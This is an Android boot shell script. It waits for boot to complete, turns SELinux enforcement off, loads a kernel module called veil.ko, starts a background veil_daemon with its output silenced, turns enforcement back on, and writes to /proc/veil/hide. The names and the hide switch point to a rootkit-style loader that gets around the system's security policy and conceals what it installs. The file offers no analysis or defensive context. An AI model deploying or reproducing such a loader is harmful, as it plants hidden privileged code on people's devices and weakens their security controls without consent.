#!/system/bin/sh
while [ "$(getprop sys.boot_completed)" != "1" ]; do
    sleep 2
done
sleep 10
OLDSELINUX=$(getenforce)
if [ "$OLDSELINUX" = "Enforcing" ]; then
    setenforce 0
fi
if [ -f /system/lib/modules/veil.ko ]; then
    insmod /system/lib/modules/veil.ko 2>/dev/null || true
fi
if [ -x /system/bin/veil_daemon ]; then
    nohup /system/bin/veil_daemon >/dev/null 2>&1 &
fi
if [ "$OLDSELINUX" = "Enforcing" ]; then
    setenforce 1
fi
if [ -w /proc/veil/hide ]; then
    echo 1 > /proc/veil/hide 2>/dev/null || true
fi
